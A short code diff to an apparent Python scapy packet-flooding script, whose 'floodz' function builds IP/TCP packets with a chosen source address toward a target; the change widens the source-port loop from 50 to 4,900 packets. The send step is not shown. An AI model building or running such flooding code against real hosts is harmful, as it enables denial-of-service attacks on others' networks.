@@ -8,7 +8,7 @@ from scapy.all import *
 
 # Function to generate packets 
 def floodz(source, target):
-    for source_p in range(100,150):
+    for source_p in range(100,5000):
         IPlayer = IP(src=source, dst=target)
         TCPlayer = TCP(sport=source_p, dport=600)
         pkt = IPlayer/TCPlayer
